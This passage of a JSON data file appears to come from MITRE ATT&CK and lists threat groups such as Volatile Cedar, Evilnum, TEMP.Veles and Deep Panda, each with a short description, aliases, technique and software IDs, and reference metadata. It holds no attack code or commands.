      "description": "[Volatile Cedar](https://attack.mitre.org/groups/G0123) is a Lebanese threat group that has targeted individuals, companies, and institutions worldwide. [Volatile Cedar](https://attack.mitre.org/groups/G0123) has been operating since 2012 and is motivated by political and ideological interests.(Citation: CheckPoint Volatile Cedar March 2015)(Citation: ClearSky Lebanese Cedar Jan 2021)",
      "aliases": [
        "Volatile Cedar",
        "Lebanese Cedar"
      ],
      "techniques": [
        "T1595.002",
        "T1595.003",
        "T1505.003",
        "T1105",
        "T1190"
      ],
      "software": [
        "S0572",
        "S0569"
      ],
      "url": "https://attack.mitre.org/groups/G0123",
      "stix_id": "intrusion-set--b2e34388-6938-4c59-a702-80dc219e15e3",
      "created": "2021-02-08T20:30:30.578000+00:00",
      "modified": "2025-04-16T20:37:38.546000+00:00"
    },
    "G0120": {
      "id": "G0120",
      "name": "Evilnum",
      "description": "[Evilnum](https://attack.mitre.org/groups/G0120) is a financially motivated threat group that has been active since at least 2018.(Citation: ESET EvilNum July 2020)",
      "aliases": [
        "Evilnum"
      ],
      "techniques": [
        "T1497.001",
        "T1219.002",
        "T1539",
        "T1566.002",
        "T1548.002",
        "T1070.004",
        "T1574.001",
        "T1204.001",
        "T1555",
        "T1105",
        "T1059.007"
      ],
      "software": [
        "S0349",
        "S0284",
        "S0568"
      ],
      "url": "https://attack.mitre.org/groups/G0120",
      "stix_id": "intrusion-set--1f0f9a14-11aa-49aa-9174-bcd0eaa979de",
      "created": "2021-01-22T16:46:17.790000+00:00",
      "modified": "2025-04-25T14:49:26.766000+00:00"
    },
    "G0003": {
      "id": "G0003",
      "name": "Cleaver",
      "description": "[Cleaver](https://attack.mitre.org/groups/G0003) is a threat group that has been attributed to Iranian actors and is responsible for activity tracked as Operation Cleaver. (Citation: Cylance Cleaver) Strong circumstantial evidence suggests Cleaver is linked to Threat Group 2889 (TG-2889). (Citation: Dell Threat Group 2889)",
      "aliases": [
        "Cleaver",
        "Threat Group 2889",
        "TG-2889"
      ],
      "techniques": [
        "T1003.001",
        "T1557.002",
        "T1588.002",
        "T1587.001",
        "T1585.001"
      ],
      "software": [
        "S0029",
        "S0002",
        "S0056",
        "S0004"
      ],
      "url": "https://attack.mitre.org/groups/G0003",
      "stix_id": "intrusion-set--8f5e8dc7-739d-4f5e-a8a1-a66e004d7063",
      "created": "2017-05-31T21:31:46.390000+00:00",
      "modified": "2025-04-16T20:37:38.869000+00:00"
    },
    "G0088": {
      "id": "G0088",
      "name": "TEMP.Veles",
      "description": "[TEMP.Veles](https://attack.mitre.org/groups/G0088) is a Russia-based threat group that has targeted critical infrastructure. The group has been observed utilizing [TRITON](https://attack.mitre.org/software/S0609), a malware framework designed to manipulate industrial safety systems.(Citation: FireEye TRITON 2019)(Citation: FireEye TEMP.Veles 2018)(Citation: FireEye TEMP.Veles JSON April 2019)",
      "aliases": [
        "TEMP.Veles",
        "XENOTIME"
      ],
      "techniques": [
        "T1588.002",
        "T1036.005",
        "T1053.005",
        "T1003.001",
        "T1587.001",
        "T1056.003",
        "T1059.001",
        "T1027.005",
        "T1573",
        "T1595",
        "T1588.002",
        "T1572",
        "T1078",
        "T1074.001",
        "T1583.003",
        "T1021.004",
        "T1036.005",
        "T1505.003",
        "T1021.001",
        "T1571",
        "T1070.004",
        "T1059.001",
        "T1133",
        "T1053.005",
        "T1070.006",
        "T1546.012",
        "T1003.001"
      ],
      "software": [
        "S0002",
        "S0029",
        "S0002",
        "S0002"
      ],
      "url": "https://attack.mitre.org/groups/G0088",
      "stix_id": "intrusion-set--9538b1a4-4120-4e2d-bf59-3b11fcab05a4",
      "created": "2019-04-16T15:14:38.533000+00:00",
      "modified": "2024-04-17T16:13:43.697000+00:00"
    },
    "G0079": {
      "id": "G0079",
      "name": "DarkHydrus",
      "description": "[DarkHydrus](https://attack.mitre.org/groups/G0079) is a threat group that has targeted government agencies and educational institutions in the Middle East since at least 2016. The group heavily leverages open-source tools and custom payloads for carrying out attacks. (Citation: Unit 42 DarkHydrus July 2018) (Citation: Unit 42 Playbook Dec 2017)",
      "aliases": [
        "DarkHydrus"
      ],
      "techniques": [
        "T1204.002",
        "T1187",
        "T1564.003",
        "T1059.001",
        "T1566.001",
        "T1221",
        "T1588.002"
      ],
      "software": [
        "S0002",
        "S0270",
        "S0154"
      ],
      "url": "https://attack.mitre.org/groups/G0079",
      "stix_id": "intrusion-set--6b9ebeb5-20bf-48b0-afb7-988d769a2f01",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:49:28.547000+00:00"
    },
    "G0107": {
      "id": "G0107",
      "name": "Whitefly",
      "description": "[Whitefly](https://attack.mitre.org/groups/G0107) is a cyber espionage group that has been operating since at least 2017. The group has targeted organizations based mostly in Singapore across a wide variety of sectors, and is primarily interested in stealing large amounts of sensitive information. The group has been linked to an attack against Singapore\u2019s largest public health organization, SingHealth.(Citation: Symantec Whitefly March 2019)",
      "aliases": [
        "Whitefly"
      ],
      "techniques": [
        "T1105",
        "T1574.001",
        "T1003.001",
        "T1068",
        "T1588.002",
        "T1059",
        "T1027.013",
        "T1204.002",
        "T1036.005"
      ],
      "software": [
        "S0002"
      ],
      "url": "https://attack.mitre.org/groups/G0107",
      "stix_id": "intrusion-set--b74f909f-8e52-4b69-b770-162bf59a1b4e",
      "created": "2020-05-26T16:55:09.674000+00:00",
      "modified": "2024-04-10T20:43:09.698000+00:00"
    },
    "G0122": {
      "id": "G0122",
      "name": "Silent Librarian",
      "description": "[Silent Librarian](https://attack.mitre.org/groups/G0122) is a group that has targeted research and proprietary data at universities, government agencies, and private sector companies worldwide since at least 2013. Members of  [Silent Librarian](https://attack.mitre.org/groups/G0122) are known to have been affiliated with the Iran-based Mabna Institute which has conducted cyber intrusions at the behest of the government of Iran, specifically the Islamic Revolutionary Guard Corps (IRGC).(Citation: DOJ Iran Indictments March 2018)(Citation: Phish Labs Silent Librarian)(Citation: Malwarebytes Silent Librarian October 2020)",
      "aliases": [
        "Silent Librarian",
        "TA407",
        "COBALT DICKENS"
      ],
      "techniques": [
        "T1588.004",
        "T1594",
        "T1114",
        "T1598.003",
        "T1589.003",
        "T1114.003",
        "T1585.002",
        "T1589.002",
        "T1608.005",
        "T1110.003",
        "T1583.001",
        "T1588.002",
        "T1078"
      ],
      "software": [],
      "url": "https://attack.mitre.org/groups/G0122",
      "stix_id": "intrusion-set--90784c1e-4aba-40eb-9adf-7556235e6384",
      "created": "2021-02-03T16:36:38.145000+00:00",
      "modified": "2025-04-25T14:49:29.613000+00:00"
    },
    "G0026": {
      "id": "G0026",
      "name": "APT18",
      "description": "[APT18](https://attack.mitre.org/groups/G0026) is a threat group that has operated since at least 2009 and has targeted a range of industries, including technology, manufacturing, human rights groups, government, and medical. (Citation: Dell Lateral Movement)",
      "aliases": [
        "APT18",
        "TG-0416",
        "Dynamite Panda",
        "Threat Group-0416"
      ],
      "techniques": [
        "T1078",
        "T1027.013",
        "T1133",
        "T1070.004",
        "T1053.002",
        "T1105",
        "T1071.004",
        "T1082",
        "T1071.001",
        "T1083",
        "T1059.003",
        "T1547.001"
      ],
      "software": [
        "S0106",
        "S0071",
        "S0032",
        "S0124",
        "S0070"
      ],
      "url": "https://attack.mitre.org/groups/G0026",
      "stix_id": "intrusion-set--38fd6a28-3353-4f2b-bb2b-459fecd5c648",
      "created": "2017-05-31T21:31:57.733000+00:00",
      "modified": "2024-04-11T03:03:44.056000+00:00"
    },
    "G0008": {
      "id": "G0008",
      "name": "Carbanak",
      "description": "[Carbanak](https://attack.mitre.org/groups/G0008) is a cybercriminal group that has used [Carbanak](https://attack.mitre.org/software/S0030) malware to target financial institutions since at least 2013. [Carbanak](https://attack.mitre.org/groups/G0008) may be linked to groups tracked separately as [Cobalt Group](https://attack.mitre.org/groups/G0080) and [FIN7](https://attack.mitre.org/groups/G0046) that have also used [Carbanak](https://attack.mitre.org/software/S0030) malware.(Citation: Kaspersky Carbanak)(Citation: FireEye FIN7 April 2017)(Citation: Europol Cobalt Mar 2018)(Citation: Secureworks GOLD NIAGARA Threat Profile)(Citation: Secureworks GOLD KINGSWOOD Threat Profile)",
      "aliases": [
        "Carbanak",
        "Anunak"
      ],
      "techniques": [
        "T1562.004",
        "T1036.004",
        "T1218.011",
        "T1078",
        "T1102.002",
        "T1543.003",
        "T1219",
        "T1036.005",
        "T1588.002"
      ],
      "software": [
        "S0002",
        "S0029",
        "S0108",
        "S0030"
      ],
      "url": "https://attack.mitre.org/groups/G0008",
      "stix_id": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
      "created": "2017-05-31T21:31:49.021000+00:00",
      "modified": "2025-04-25T14:49:30.378000+00:00"
    },
    "G0071": {
      "id": "G0071",
      "name": "Orangeworm",
      "description": "[Orangeworm](https://attack.mitre.org/groups/G0071) is a group that has targeted organizations in the healthcare sector in the United States, Europe, and Asia since at least 2015, likely for the purpose of corporate espionage.(Citation: Symantec Orangeworm April 2018) Reverse engineering of [Kwampirs](https://attack.mitre.org/software/S0236), directly associated with [Orangeworm](https://attack.mitre.org/groups/G0071) activity, indicates significant functional and development overlaps with [Shamoon](https://attack.mitre.org/software/S0140).(Citation: Cylera Kwampirs 2022)",
      "aliases": [
        "Orangeworm"
      ],
      "techniques": [
        "T1071.001",
        "T1021.002"
      ],
      "software": [
        "S0104",
        "S0039",
        "S0100",
        "S0106",
        "S0103",
        "S0099",
        "S0096",
        "S0236"
      ],
      "url": "https://attack.mitre.org/groups/G0071",
      "stix_id": "intrusion-set--5636b7b3-d99b-4edd-aa05-ee649c1d4ef1",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2024-04-10T21:33:28.444000+00:00"
    },
    "G0009": {
      "id": "G0009",
      "name": "Deep Panda",
      "description": "[Deep Panda](https://attack.mitre.org/groups/G0009) is a suspected Chinese threat group known to target many industries, including government, defense, financial, and telecommunications. (Citation: Alperovitch 2014) The intrusion into healthcare company Anthem has been attributed to [Deep Panda](https://attack.mitre.org/groups/G0009). (Citation: ThreatConnect Anthem) This group is also known as Shell Crew, WebMasters, KungFu Kittens, and PinkPanther. (Citation: RSA Shell Crew) [Deep Panda](https://attack.mitre.org/groups/G0009) also appears to be known as Black Vine based on the attribution of both group names to the Anthem intrusion. (Citation: Symantec Black Vine) Some analysts track [Deep Panda](https://attack.mitre.org/groups/G0009) and [APT19](https://attack.mitre.org/groups/G0073) as the same group, but it is unclear from open source information if the groups are the same. (Citation: ICIT China's Espionage Jul 2016)",
      "aliases": [
        "Deep Panda",
        "Shell Crew",
        "WebMasters",
        "KungFu Kittens",
        "PinkPanther",
        "Black Vine"
      ],
      "techniques": [
        "T1057",
        "T1018",
        "T1505.003",
        "T1027.005",
        "T1218.010",
        "T1564.003",
        "T1059.001",
        "T1546.008",
        "T1047",
        "T1021.002"
      ],
      "software": [
        "S0097",
        "S0039",
        "S0057",
        "S0080",
        "S0142",
        "S0074",
        "S0021"
      ],
      "url": "https://attack.mitre.org/groups/G0009",
      "stix_id": "intrusion-set--a653431d-6a5e-4600-8ad3-609b5af57064",
      "created": "2017-05-31T21:31:49.412000+00:00",
      "modified": "2025-04-16T20:37:39.486000+00:00"
    },
    "G0099": {
      "id": "G0099",
      "name": "APT-C-36",
      "description": "[APT-C-36](https://attack.mitre.org/groups/G0099) is a suspected South America espionage group that has been active since at least 2018. The group mainly targets Colombian government institutions as well as important corporations in the financial sector, petroleum industry, and professional manufacturing.(Citation: QiAnXin APT-C-36 Feb2019)",
      "aliases": [
        "APT-C-36",
        "Blind Eagle"
      ],
      "techniques": [
        "T1204.002",
        "T1036.004",
        "T1588.002",
        "T1027",
        "T1053.005",
        "T1105",
        "T1059.005",
        "T1571",
        "T1566.001"
      ],
      "software": [
        "S0434"
      ],
      "url": "https://attack.mitre.org/groups/G0099",
      "stix_id": "intrusion-set--c4d50cdf-87ce-407d-86d8-862883485842",
      "created": "2020-05-05T18:53:08.166000+00:00",
      "modified": "2025-04-25T14:49:32.503000+00:00"
    },
    "G0089": {
      "id": "G0089",
      "name": "The White Company",
      "description": "[The White Company](https://attack.mitre.org/groups/G0089) is a likely state-sponsored threat actor with advanced capabilities. From 2017 through 2018, the group led an espionage campaign called Operation Shaheen targeting government and military organizations in Pakistan.(Citation: Cylance Shaheen Nov 2018)",
      "aliases": [
        "The White Company"
      ],
      "techniques": [
        "T1027.002",
        "T1518.001",
        "T1203",
        "T1070.004",
        "T1566.001",
        "T1204.002",
        "T1124"
      ],
      "software": [
        "S0379",
        "S0198"
      ],
      "url": "https://attack.mitre.org/groups/G0089",
      "stix_id": "intrusion-set--6688d679-ccdb-4f12-abf6-c7545dd767a4",
      "created": "2019-05-02T00:08:18.314000+00:00",
      "modified": "2025-04-25T14:49:32.865000+00:00"
    },
    "G0033": {
      "id": "G0033",
      "name": "Poseidon Group",
      "description": "[Poseidon Group](https://attack.mitre.org/groups/G0033) is a Portuguese-speaking threat group that has been active since at least 2005. The group has a history of using information exfiltrated from victims to blackmail victim companies into contracting the [Poseidon Group](https://attack.mitre.org/groups/G0033) as a security firm. (Citation: Kaspersky Poseidon Group)",
      "aliases": [
        "Poseidon Group"
      ],
      "techniques": [
        "T1049",
        "T1003",
        "T1007",
        "T1087.002",
        "T1087.001",
        "T1057",
        "T1036.005",
        "T1059.001"
      ],
      "software": [],
      "url": "https://attack.mitre.org/groups/G0033",
      "stix_id": "intrusion-set--7ecc3b4f-5cdb-457e-b55a-df376b359446",
      "created": "2017-05-31T21:32:04.179000+00:00",
      "modified": "2025-04-25T14:49:33.223000+00:00"
    },
    "G0140": {
      "id": "G0140",
      "name": "LazyScripter",
      "description": "[LazyScripter](https://attack.mitre.org/groups/G0140) is threat group that has mainly targeted the airlines industry since at least 2018, primarily using open-source toolsets.(Citation: MalwareBytes LazyScripter Feb 2021)",
      "aliases": [
        "LazyScripter"
      ],
      "techniques": [
        "T1204.001",
        "T1218.005",
        "T1608.001",
        "T1204.002",
        "T1102",
        "T1059.007",
        "T1583.001",
        "T1059.005",
        "T1071.004",
        "T1588.001",
        "T1105",
        "T1036",
        "T1566.001",
        "T1059.001",
        "T1059.003",
        "T1027.010",
        "T1547.001",
        "T1218.011",
        "T1566.002",
        "T1583.006"
      ],
      "software": [
        "S0332",
        "S0262",
        "S0508",
        "S0363",
        "S0250",
        "S0385",
        "S0669"
      ],
      "url": "https://attack.mitre.org/groups/G0140",
      "stix_id": "intrusion-set--abc5a1d4-f0dc-49d1-88a1-4a80e478bb03",
      "created": "2021-11-24T19:26:27.305000+00:00",
      "modified": "2024-11-17T14:12:07.294000+00:00"
    },
    "G0084": {
      "id": "G0084",
      "name": "Gallmaker",
      "description": "[Gallmaker](https://attack.mitre.org/groups/G0084) is a cyberespionage group that has targeted victims in the Middle East and has been active since at least December 2017. The group has mainly targeted victims in the defense, military, and government sectors.(Citation: Symantec Gallmaker Oct 2018)",
      "aliases": [
        "Gallmaker"
      ],
      "techniques": [
        "T1204.002",
        "T1027",
        "T1560.001",
        "T1559.002",
        "T1059.001",
        "T1566.001"
      ],
      "software": [],
      "url": "https://attack.mitre.org/groups/G0084",
      "stix_id": "intrusion-set--2fd2be6a-d3a2-4a65-b499-05ea2693abee",
      "created": "2019-01-30T14:26:42.897000+00:00",
      "modified": "2025-04-25T14:49:34.304000+00:00"
    },
    "G1019": {
      "id": "G1019",
      "name": "MoustachedBouncer",
      "description": "[MoustachedBouncer](https://attack.mitre.org/groups/G1019) is a cyberespionage group that has been active since at least 2014 targeting foreign embassies in Belarus.(Citation: MoustachedBouncer ESET August 2023)",
      "aliases": [
        "MoustachedBouncer"
      ],
      "techniques": [
        "T1059.001",
        "T1059.007",
        "T1027.002",
        "T1113",
        "T1090",
        "T1068",
        "T1074.002",
        "T1659"
      ],
      "software": [
        "S1090",
        "S1088",
        "S1089"
      ],
      "url": "https://attack.mitre.org/groups/G1019",
      "stix_id": "intrusion-set--7251b44b-6072-476c-b8d9-a6e32c355b28",
      "created": "2023-09-25T18:11:05.672000+00:00",
      "modified": "2025-04-16T20:37:40.255000+00:00"
    },
    "G0052": {
      "id": "G0052",
      "name": "CopyKittens",
      "description": "[CopyKittens](https://attack.mitre.org/groups/G0052) is an Iranian cyber espionage group that has been operating since at least 2013. It has targeted countries including Israel, Saudi Arabia, Turkey, the U.S., Jordan, and Germany. The group is responsible for the campaign known as Operation Wilted Tulip.(Citation: ClearSky CopyKittens March 2017)(Citation: ClearSky Wilted Tulip July 2017)(Citation: CopyKittens Nov 2015)",
      "aliases": [
        "CopyKittens"
      ],
      "techniques": [
        "T1560.003",
        "T1560.001",
        "T1059.001",
        "T1090",
        "T1218.011",
        "T1564.003",
        "T1588.002",
        "T1553.002"
      ],
      "software": [
        "S0363",
        "S0154",
        "S0164",
        "S0167"
      ],
      "url": "https://attack.mitre.org/groups/G0052",
      "stix_id": "intrusion-set--dcd81c6e-ebf7-4a16-93e0-9a97fa49c88a",
      "created": "2018-01-16T16:13:52.465000+00:00",
      "modified": "2024-11-17T12:44:07.637000+00:00"
    },
    "G1033": {
      "id": "G1033",
      "name": "Star Blizzard",
      "description": "[Star Blizzard](https://attack.mitre.org/groups/G1033) is a cyber espionage and influence group originating in Russia that has been active since at least 2019. [Star Blizzard](https://attack.mitre.org/groups/G1033) campaigns align closely with Russian state interests and have included persistent phishing and credential theft against academic, defense, government, NGO, and think tank organizations in NATO countries, particularly the US and the UK.(Citation: Microsoft Star Blizzard August 2022)(Citation: CISA Star Blizzard Advisory December 2023)(Citation: StarBlizzard)(Citation: Google TAG COLDRIVER January 2024)\n",
      "aliases": [
        "Star Blizzard",
        "SEABORGIUM",
        "Callisto Group",
        "TA446",
        "COLDRIVER"
      ],
      "techniques": [
        "T1583.001",
        "T1114.002",
        "T1550.004",
        "T1204.002",
        "T1608.001",
        "T1539",
        "T1589",
        "T1585.002",
        "T1566.001",
        "T1598.002",
        "T1598.003",
        "T1588.002",
        "T1583",
        "T1114.003",
        "T1585.001",
        "T1078",
        "T1586.002",
        "T1059.007",
        "T1593"
      ],
      "software": [
        "S1140"
      ],
      "url": "https://attack.mitre.org/groups/G1033",
      "stix_id": "intrusion-set--9b36c218-4d80-4ec6-a68d-cc2886bbe410",
      "created": "2024-06-14T18:17:18.727000+00:00",
      "modified": "2024-06-14T18:39:26.684000+00:00"
    },
    "G0076": {
      "id": "G0076",
      "name": "Thrip",
      "description": "[Thrip](https://attack.mitre.org/groups/G0076) is an espionage group that has targeted satellite communications, telecoms, and defense contractor companies in the U.S. and Southeast Asia. The group uses custom malware as well as \"living off the land\" techniques. (Citation: Symantec Thrip June 2018)",
      "aliases": [
        "Thrip"
      ],
      "techniques": [
        "T1059.001",
        "T1048.003",
        "T1219.002",
        "T1588.002"
      ],
      "software": [
        "S0029",
        "S0002",
        "S0261"
      ],
      "url": "https://attack.mitre.org/groups/G0076",
      "stix_id": "intrusion-set--d69e568e-9ac8-4c08-b32c-d93b43ba9172",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:49:36.307000+00:00"
    },
    "G0056": {
      "id": "G0056",
      "name": "PROMETHIUM",
      "description": "[PROMETHIUM](https://attack.mitre.org/groups/G0056) is an activity group focused on espionage that has been active since at least 2012. The group has conducted operations globally with a heavy emphasis on Turkish targets. [PROMETHIUM](https://attack.mitre.org/groups/G0056) has demonstrated similarity to another activity group called [NEODYMIUM](https://attack.mitre.org/groups/G0055) due to overlapping victim and campaign characteristics.(Citation: Microsoft NEODYMIUM Dec 2016)(Citation: Microsoft SIR Vol 21)(Citation: Talos Promethium June 2020)",
      "aliases": [
        "PROMETHIUM",
        "StrongPity"
      ],
      "techniques": [
        "T1204.002",
        "T1587.002",
        "T1078.003",
        "T1587.003",
        "T1547.001",
        "T1543.003",
        "T1036.005",
        "T1036.004",
        "T1553.002",
        "T1205.001",
        "T1189"
      ],
      "software": [
        "S0178",
        "S0491",
        "S0491"
      ],
      "url": "https://attack.mitre.org/groups/G0056",
      "stix_id": "intrusion-set--efed95ba-d7e8-47ff-8c53-99c42426ee7c",
      "created": "2018-01-16T16:13:52.465000+00:00",
      "modified": "2024-04-19T19:35:15.637000+00:00"
    },
    "G0036": {
      "id": "G0036",
      "name": "GCMAN",
      "description": "[GCMAN](https://attack.mitre.org/groups/G0036) is a threat group that focuses on targeting banks for the purpose of transferring money to e-currency services. (Citation: Securelist GCMAN)",
      "aliases": [
        "GCMAN"
      ],
      "techniques": [
        "T1021.005",
        "T1021.004"
      ],
      "software": [],
      "url": "https://attack.mitre.org/groups/G0036",
      "stix_id": "intrusion-set--0ea72cd5-ca30-46ba-bc04-378f701c658f",
      "created": "2017-05-31T21:32:05.611000+00:00",
      "modified": "2025-04-25T14:49:37.572000+00:00"
    },
    "G0137": {
      "id": "G0137",
      "name": "Ferocious Kitten",
      "description": "[Ferocious Kitten](https://attack.mitre.org/groups/G0137) is a threat group that has primarily targeted Persian-speaking individuals in Iran since at least 2015.(Citation: Kaspersky Ferocious Kitten Jun 2021)",
      "aliases": [
        "Ferocious Kitten"
      ],
      "techniques": [
        "T1204.002",
        "T1036.002",
        "T1036.005",
        "T1566.001",
        "T1588.002",
        "T1583.001"
      ],
      "software": [
        "S0190",
        "S0652"
      ],
      "url": "https://attack.mitre.org/groups/G0137",
      "stix_id": "intrusion-set--6566aac9-dad8-4332-ae73-20c23bad7f02",
      "created": "2021-09-28T17:41:12.950000+00:00",
      "modified": "2025-04-25T14:49:38.455000+00:00"
    },
    "G0011": {
      "id": "G0011",
      "name": "PittyTiger",
      "description": "[PittyTiger](https://attack.mitre.org/groups/G0011) is a threat group believed to operate out of China that uses multiple different types of malware to maintain command and control.(Citation: Bizeul 2014)(Citation: Villeneuve 2014)",
      "aliases": [
        "PittyTiger"
      ],
      "techniques": [
        "T1588.002",
        "T1078"
      ],
      "software": [
        "S0008",
        "S0002",
        "S0032",
        "S0010",
        "S0012"
      ],
      "url": "https://attack.mitre.org/groups/G0011",
      "stix_id": "intrusion-set--fe98767f-9df8-42b9-83c9-004b1dec8647",
      "created": "2017-05-31T21:31:50.198000+00:00",
      "modified": "2025-04-25T14:49:38.981000+00:00"
    },
    "G0025": {
      "id": "G0025",
      "name": "APT17",
      "description": "[APT17](https://attack.mitre.org/groups/G0025) is a China-based threat group that has conducted network intrusions against U.S. government entities, the defense industry, law firms, information technology companies, mining companies, and non-government organizations. (Citation: FireEye APT17)",
      "aliases": [
        "APT17",
        "Deputy Dog"
      ],
      "techniques": [
        "T1583.006",
        "T1585"
      ],
      "software": [
        "S0069"
      ],
      "url": "https://attack.mitre.org/groups/G0025",
      "stix_id": "intrusion-set--090242d7-73fc-4738-af68-20162f7a5aae",
      "created": "2017-05-31T21:31:57.307000+00:00",
      "modified": "2024-11-17T15:03:54.769000+00:00"
    },
    "G0063": {
      "id": "G0063",
      "name": "BlackOasis",
      "description": "[BlackOasis](https://attack.mitre.org/groups/G0063) is a Middle Eastern threat group that is believed to be a customer of Gamma Group. The group has shown interest in prominent figures in the United Nations, as well as opposition bloggers, activists, regional news correspondents, and think tanks. (Citation: Securelist BlackOasis Oct 2017) (Citation: Securelist APT Trends Q2 2017) A group known by Microsoft as [NEODYMIUM](https://attack.mitre.org/groups/G0055) is reportedly associated closely with [BlackOasis](https://attack.mitre.org/groups/G0063) operations, but evidence that the group names are aliases has not been identified. (Citation: CyberScoop BlackOasis Oct 2017)",
      "aliases": [
        "BlackOasis"
      ],
      "techniques": [
        "T1027"
      ],
      "software": [],
      "url": "https://attack.mitre.org/groups/G0063",
      "stix_id": "intrusion-set--da49b9f1-ca99-443f-9728-0a074db66850",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-25T14:49:40.224000+00:00"
    },
    "G0136": {
      "id": "G0136",
      "name": "IndigoZebra",
      "description": "[IndigoZebra](https://attack.mitre.org/groups/G0136) is a suspected Chinese cyber espionage group that has been targeting Central Asian governments since at least 2014.(Citation: HackerNews IndigoZebra July 2021)(Citation: Checkpoint IndigoZebra July 2021)(Citation: Securelist APT Trends Q2 2017)",
      "aliases": [
        "IndigoZebra"
      ],
      "techniques": [
        "T1583.001",
        "T1588.002",
        "T1583.006",
        "T1586.002",
        "T1566.001",
        "T1204.002",
        "T1105"
      ],
      "software": [
        "S0653",
        "S0651",
        "S0012"
      ],
      "url": "https://attack.mitre.org/groups/G0136",
      "stix_id": "intrusion-set--e5603ea8-4c36-40e7-b7af-a077d24fedc1",
      "created": "2021-09-24T21:41:34.797000+00:00",
      "modified": "2025-04-25T14:49:40.589000+00:00"
    },
    "G0083": {
      "id": "G0083",
      "name": "SilverTerrier",
      "description": "[SilverTerrier](https://attack.mitre.org/groups/G0083) is a Nigerian threat group that has been seen active since 2014. [SilverTerrier](https://attack.mitre.org/groups/G0083) mainly targets organizations in high technology, higher education, and manufacturing.(Citation: Unit42 SilverTerrier 2018)(Citation: Unit42 SilverTerrier 2016)",
      "aliases": [
        "SilverTerrier"
      ],
      "techniques": [
        "T1071.003",
        "T1071.001",
        "T1071.002",
        "T1657"
      ],
      "software": [
        "S0336",
        "S0331",
        "S0198",
        "S0334",
        "S0447"
      ],
      "url": "https://attack.mitre.org/groups/G0083",
      "stix_id": "intrusion-set--76565741-3452-4069-ab08-80c0ea95bbeb",
      "created": "2019-01-29T21:36:59.793000+00:00",
      "modified": "2023-09-27T20:22:05.127000+00:00"
    },
    "G0041": {
      "id": "G0041",
      "name": "Strider",
      "description": "[Strider](https://attack.mitre.org/groups/G0041) is a threat group that has been active since at least 2011 and has targeted victims in Russia, China, Sweden, Belgium, Iran, and Rwanda.(Citation: Symantec Strider Blog)(Citation: Kaspersky ProjectSauron Blog)",
      "aliases": [
        "Strider",
        "ProjectSauron"
      ],
      "techniques": [
        "T1090.001",
        "T1556.002",
        "T1564.005"
      ],
      "software": [
        "S0125"
      ],
      "url": "https://attack.mitre.org/groups/G0041",
      "stix_id": "intrusion-set--277d2f87-2ae5-4730-a3aa-50c1fdff9656",
      "created": "2017-05-31T21:32:07.541000+00:00",
      "modified": "2025-04-25T14:49:43.099000+00:00"
    },
    "G0029": {
      "id": "G0029",
      "name": "Scarlet Mimic",
      "description": "[Scarlet Mimic](https://attack.mitre.org/groups/G0029) is a threat group that has targeted minority rights activists. This group has not been directly linked to a government source, but the group's motivations appear to overlap with those of the Chinese government. While there is some overlap between IP addresses used by [Scarlet Mimic](https://attack.mitre.org/groups/G0029) and [Putter Panda](https://attack.mitre.org/groups/G0024), it has not been concluded that the groups are the same. (Citation: Scarlet Mimic Jan 2016)",
      "aliases": [
        "Scarlet Mimic"
      ],
      "techniques": [
        "T1036.002"
      ],
      "software": [
        "S0078",
        "S0079",
        "S0077",
        "S0076"
      ],
      "url": "https://attack.mitre.org/groups/G0029",
      "stix_id": "intrusion-set--c5574ca0-d5a4-490a-b207-e4658e5fd1d7",
      "created": "2017-05-31T21:32:00.677000+00:00",
      "modified": "2025-04-25T14:49:45.222000+00:00"
    },
    "G1038": {
      "id": "G1038",
      "name": "TA578",
      "description": "[TA578](https://attack.mitre.org/groups/G1038) is a threat actor that has used contact forms and email to initiate communications with victims and to distribute malware including [Latrodectus](https://attack.mitre.org/software/S1160), [IcedID](https://attack.mitre.org/software/S0483), and [Bumblebee](https://attack.mitre.org/software/S1039).(Citation: Latrodectus APR 2024)(Citation: Bitsight Latrodectus June 2024)",
      "aliases": [
        "TA578"
      ],
      "techniques": [
        "T1204.001",
        "T1594",
        "T1583.006",
        "T1059.007"
      ],
      "software": [
        "S1039",
        "S1160",
        "S0483"
      ],
      "url": "https://attack.mitre.org/groups/G1038",
      "stix_id": "intrusion-set--a5cfbc79-316c-42f2-915d-6e8fef4085f8",
      "created": "2024-09-17T17:55:44.833000+00:00",
      "modified": "2024-09-17T17:55:58.333000+00:00"
    },
    "G0023": {
      "id": "G0023",
      "name": "APT16",
      "description": "[APT16](https://attack.mitre.org/groups/G0023) is a China-based threat group that has launched spearphishing campaigns targeting Japanese and Taiwanese organizations. (Citation: FireEye EPS Awakens Part 2)",
      "aliases": [
        "APT16"
      ],
      "techniques": [
        "T1584.004"
      ],
      "software": [
        "S0064"
      ],
      "url": "https://attack.mitre.org/groups/G0023",
      "stix_id": "intrusion-set--d6e88e18-81e8-4709-82d8-973095da1e70",
      "created": "2017-05-31T21:31:56.270000+00:00",
      "modified": "2025-04-16T20:37:41.686000+00:00"
    },
    "G0002": {
      "id": "G0002",
      "name": "Moafee",
      "description": "[Moafee](https://attack.mitre.org/groups/G0002) is a threat group that appears to operate from the Guandong Province of China. Due to overlapping TTPs, including similar custom tools, Moafee is thought to have a direct or indirect relationship with the threat group [DragonOK](https://attack.mitre.org/groups/G0017). (Citation: Haq 2014)",
      "aliases": [
        "Moafee"
      ],
      "techniques": [
        "T1027.001"
      ],
      "software": [
        "S0012"
      ],
      "url": "https://attack.mitre.org/groups/G0002",
      "stix_id": "intrusion-set--2e5d3a83-fe00-41a5-9b60-237efc84832f",
      "created": "2017-05-31T21:31:46.025000+00:00",
      "modified": "2025-04-25T14:49:46.105000+00:00"
    },
    "G0055": {
      "id": "G0055",
      "name": "NEODYMIUM",
      "description": "[NEODYMIUM](https://attack.mitre.org/groups/G0055) is an activity group that conducted a campaign in May 2016 and has heavily targeted Turkish victims. The group has demonstrated similarity to another activity group called [PROMETHIUM](https://attack.mitre.org/groups/G0056) due to overlapping victim and campaign characteristics. (Citation: Microsoft NEODYMIUM Dec 2016) (Citation: Microsoft SIR Vol 21) [NEODYMIUM](https://attack.mitre.org/groups/G0055) is reportedly associated closely with [BlackOasis](https://attack.mitre.org/groups/G0063) operations, but evidence that the group names are aliases has not been identified. (Citation: CyberScoop BlackOasis Oct 2017)",
      "aliases": [
        "NEODYMIUM"
      ],
      "techniques": [],
